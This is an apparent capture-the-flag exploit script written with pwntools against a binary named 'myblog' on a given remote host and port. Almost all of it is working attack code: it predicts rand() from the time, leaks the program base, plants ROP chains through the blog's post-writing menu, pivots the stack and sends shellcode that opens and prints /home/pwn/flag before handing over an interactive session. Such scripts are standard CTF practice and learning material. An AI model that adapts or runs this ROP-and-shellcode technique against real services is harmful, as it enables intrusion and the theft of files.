from pwn import *
import sys, time
import ctypes
LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

### Config ###
filename = './myblog'
rhost = "159.65.125.233"
rport = 31337

### Binary ###
context.binary = filename
binary = ELF(filename)

#context.log_level='debug' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

### Start exploit ###
if len(sys.argv) == 1:
    p = process([filename])
else:
    p = remote(rhost,rport)

LIBC.srand(LIBC.time(0))
val = LIBC.rand()
addr = val & 0xfffff000
time.sleep(0.2)
p.sendline("31337")
p.recvuntil("gift ")
hidden = int(p.recvuntil("\n")[:-1], 0)
base = hidden & 0xfffffffffffff000
excute = base + 0x202048

main = base + 0x1058

print hex(base)

'''
.text:0000000000000D51                 mov     edx, 2Fh ; '/'  ; nbytes
.text:0000000000000D56                 mov     rsi, rax        ; buf
.text:0000000000000D59                 mov     edi, 0          ; fd
.text:0000000000000D5E                 mov     eax, 0
.text:0000000000000D63                 call    _read


.text:0000000000000F24                 mov     edx, 18h        ; nbytes
.text:0000000000000F29                 mov     rsi, rax        ; buf
.text:0000000000000F2C                 mov     edi, 0          ; fd
.text:0000000000000F31                 mov     eax, 0
.text:0000000000000F36                 call    _read
'''

target = base + 0xd51
target = base + 0xf24

sc = asm('''
        leave
        leave
        pop rsi
        pop rax
        pop rbx
        pop rdx
        ret
        ''')

time.sleep(0.2)
p.sendline("AA")
p.recvuntil("Done!!")

## allocate ##

pop1rdi = base + 0x0000000000001173     # : pop rdi; ret;
pop2rsi = base + 0x0000000000001171     # : pop rsi; pop r15; ret;
pop1rbp = base + 0x0000000000000990     # : pop rbp; ret;
pop4ret = base + 0x000000000000116c     # : pop r12; pop r13; pop r14; pop r15; ret;
ret = base + 0x000000000000083e     # : ret;

puts_got = base + 0x0000000000201f78
puts = base + 0x860
main = base + 0x1058
read = base + 0x890

def uwrite(data, author):
    p.sendline("1")
    p.sendafter("content\n", data)      # 0x2f
    p.sendafter("author\n", author)     # 0x7

def delete(idx):
    p.sendline("2")
    p.sendlineafter("index\n", str(idx))

# 6 chains

payload = p64(0x2000) + p64(pop1rdi) + p64(0) + p64(read) + p64(read) + p64(pop4ret)[:-1]
time.sleep(0.5)
uwrite(payload, p32(0xcafebabe))
time.sleep(0.5)
uwrite(payload, p32(0xcafebabe))
time.sleep(0.5)
uwrite(payload, p32(0xcafebabe))
time.sleep(0.5)
uwrite(payload, p32(0xcafebabe))
time.sleep(0.5)
uwrite(payload, p32(0xcafebabe))

##############

time.sleep(0.5)
p.sendline("3")
#p.send(sc)
p.send(sc.ljust(7, "\x00"))

##############

p.recvuntil("Exit\n")

print hex(addr)
log.info("First Stage")
p.sendline("31337")
time.sleep(0.5)
p.sendline(p64(0xdeadbeef) + p64(addr + 8) + p64(addr))

time.sleep(0.5)
exp = p64(ret) * 30
#exp += p64(pop1rdi) + p64(puts_got) + p64(puts)
exp += p64(pop1rdi) + p64(0)
exp += p64(pop2rsi) + p64(addr) * 2 + p64(read) + p64(addr) * 2
time.sleep(0.5)
log.info("final stage")
p.sendline(exp)
'''
p.recvuntil("==============================")
p.recvuntil("Done!!\n")
leak = u64(p.recv(6).ljust(8, "\x00"))
print hex(leak)
libc_base = leak - 0x6f690
binsh = libc_base + 0x18cd57
'''
time.sleep(0.2)
sc = asm('''
        mov rax, 0
        mov rsi, ''' + hex(base + 0x202300) + '''
        mov rdx, 0x200
        mov rdi, 0
        syscall
        mov rax, 257
        mov rdi, 0
        mov rsi, ''' + hex(base + 0x202300) + '''
        mov rdx, 0
        mov rcx, 0
        syscall
        mov rdi, rax
        mov rsi, ''' + hex(base + 0x202400) + '''
        mov rdx, 0x100
        mov rax, 0
        syscall
        mov rdi, 1
        mov rsi, ''' + hex(base + 0x202400) + '''
        mov rax, 1
        syscall
        ''')

log.info("Sending shellcode")
p.sendline(sc)
time.sleep(0.2)
p.sendline("/home/pwn/flag\x00")
p.interactive()
